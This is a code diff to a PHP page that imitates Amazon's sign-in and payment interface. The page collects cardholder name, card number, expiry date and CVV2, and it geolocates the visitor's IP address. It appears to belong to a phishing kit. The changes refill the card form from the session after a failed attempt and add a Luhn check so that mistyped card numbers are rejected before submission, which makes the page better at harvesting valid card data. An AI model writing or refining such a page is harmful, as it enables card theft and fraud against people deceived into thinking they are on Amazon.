@@ -1,7 +1,21 @@
 <?php
+session_start();
+
 $ip = $_SERVER['REMOTE_ADDR']; // the IP address to query
 $query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
 
+$showInvalidData = isset($_GET['invalid_data']);
+$prefill = $showInvalidData ? ($_SESSION['card_form_data'] ?? []) : [];
+
+if (!$showInvalidData && isset($_SESSION['card_form_data'])) {
+    unset($_SESSION['card_form_data']);
+}
+
+$holderValue = isset($prefill['holder']) ? htmlspecialchars($prefill['holder'], ENT_QUOTES, 'UTF-8') : '';
+$cardNumberValue = isset($prefill['ccnum']) ? htmlspecialchars($prefill['ccnum'], ENT_QUOTES, 'UTF-8') : '';
+$expMonthValue = isset($prefill['exp_month']) ? (string) $prefill['exp_month'] : '4';
+$expYearValue = isset($prefill['exp_year']) ? (string) $prefill['exp_year'] : '2022';
+$cvvValue = isset($prefill['cvv2']) ? htmlspecialchars($prefill['cvv2'], ENT_QUOTES, 'UTF-8') : '';
 ?>
 
 <!doctype html><html class="a-no-js" data-19ax5a9jf="dingo">
@@ -146,19 +160,15 @@ amzn.copilot.checkCoPilotSession();
 
 
   
-<?php if(isset($_GET['invalid_data'])){?>
-
-    <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+    <div id="auth-invalid-card-error" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"<?php echo $showInvalidData ? '' : ' style="display:none;"'; ?>><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
       <ul class="a-nostyle a-vertical a-spacing-none">
-        
+
           <li><span class="a-list-item">
             Please correct and try again.
           </span></li>
-        
+
       </ul>
     </div></div></div>
-  
-<?php } ?>
   
 
   
@@ -255,17 +265,17 @@ amzn.copilot.checkCoPilotSession();
 <label for="ap_email">
               Card Holder Name
             </label>
-<input type="text" value="<?php if(isset($_POST['fullname'])){ echo $_POST['fullname'];}?>" name="holder" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+<input type="text" value="<?php echo $holderValue; ?>" name="holder" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
 <BR/><BR/>
 <label for="ap_email">
               Card Number
             </label>
-<input type="text" name="ccnum" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+<input type="text" name="ccnum" value="<?php echo $cardNumberValue; ?>" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
 <BR/><BR/>
-<label>Expiration date</label><span><span class="a-dropdown-container"><select name="EXP1" autocomplete="off" id="pmts-id-14" class="a-native-dropdown"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4" selected="">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">04</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><span class="a-letter-space"></span><span><span class="a-dropdown-container"><select name="EXP2" autocomplete="off" id="pmts-id-16" class="a-native-dropdown"><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022" selected="">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt">2016</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><br><span id="pmts-id-17"></span></div><fieldset class="a-spacing-top-base pmts-form-fields pmts-cup-mbcc"><div class="a-input-text-group"><div class="a-row a-spacing-top-none"><ul class="a-nostyle a-horizontal a-spacing-none"><li><span class="a-list-item">
+<label>Expiration date</label><span><span class="a-dropdown-container"><select name="EXP1" autocomplete="off" id="pmts-id-14" class="a-native-dropdown"><?php for ($month = 1; $month <= 12; $month++) { $value = (string) $month; $label = str_pad($month, 2, '0', STR_PAD_LEFT); $selected = $value === $expMonthValue ? ' selected' : ''; echo "<option value=\"{$value}\"{$selected}>{$label}</option>"; } ?></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt"><?php echo str_pad((int) $expMonthValue, 2, '0', STR_PAD_LEFT); ?></span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><span class="a-letter-space"></span><span><span class="a-dropdown-container"><select name="EXP2" autocomplete="off" id="pmts-id-16" class="a-native-dropdown"><?php for ($year = 2016; $year <= 2035; $year++) { $value = (string) $year; $selected = $value === $expYearValue ? ' selected' : ''; echo "<option value=\"{$value}\"{$selected}>{$value}</option>"; } ?></select><span tabindex="-1" class="a-button a-button-dropdown"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-haspopup="true" role="button" tabindex="0"><span class="a-dropdown-prompt"><?php echo htmlspecialchars($expYearValue, ENT_QUOTES, 'UTF-8'); ?></span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></span><br><span id="pmts-id-17"></span></div><fieldset class="a-spacing-top-base pmts-form-fields pmts-cup-mbcc"><div class="a-input-text-group"><div class="a-row a-spacing-top-none"><ul class="a-nostyle a-horizontal a-spacing-none"><li><span class="a-list-item">
 
 
-<label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=201461830"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-18" name="cvv2" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
+<label for="pmts-id-18" class="pmts-form-label">CVV2</label></span></li><li><span class="a-list-item"><label>(<a class="pmts-cup-mbcc-help-link" target="_blank" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=201461830"> What's this? </a>)</label></span></li></ul><input type="text" maxlength="4" id="pmts-id-18" name="cvv2" value="<?php echo $cvvValue; ?>" class="a-input-text a-width-large"><br><span id="pmts-id-19"></span></div><BR/>
 <div class="a-divider a-divider-break"><h5></h5></div>
 <BR/>
   <div class="a-row a-spacing-top-medium">
@@ -391,6 +401,76 @@ amzn.copilot.checkCoPilotSession();
 
 
 </div>
+
+<script>
+(function () {
+  function luhnCheck(number) {
+    var digits = String(number || '').replace(/\D/g, '');
+
+    if (!digits.length) {
+      return false;
+    }
+
+    var sum = 0;
+    var shouldDouble = false;
+
+    for (var i = digits.length - 1; i >= 0; i--) {
+      var digit = parseInt(digits.charAt(i), 10);
+
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) {
+          digit -= 9;
+        }
+      }
+
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+
+    return sum % 10 === 0;
+  }
+
+  var form = document.querySelector('form[name="signIn"]');
+  if (!form) {
+    return;
+  }
+
+  var errorBox = document.getElementById('auth-invalid-card-error');
+
+  form.addEventListener('submit', function (event) {
+    var ccInput = form.querySelector('input[name="ccnum"]');
+
+    if (!ccInput) {
+      return;
+    }
+
+    if (!luhnCheck(ccInput.value)) {
+      event.preventDefault();
+
+      if (errorBox) {
+        errorBox.style.display = 'block';
+      }
+
+      if (typeof URL !== 'undefined') {
+        try {
+          var currentUrl = new URL(window.location.href);
+          currentUrl.searchParams.set('invalid_data', '1');
+          if (window.history && typeof window.history.replaceState === 'function') {
+            window.history.replaceState(null, document.title, currentUrl.toString());
+          }
+        } catch (error) {
+          // Ignore URL parsing errors in older browsers.
+        }
+      }
+
+      if (errorBox && typeof errorBox.scrollIntoView === 'function') {
+        errorBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }
+  });
+})();
+</script>
 
 
 </body>
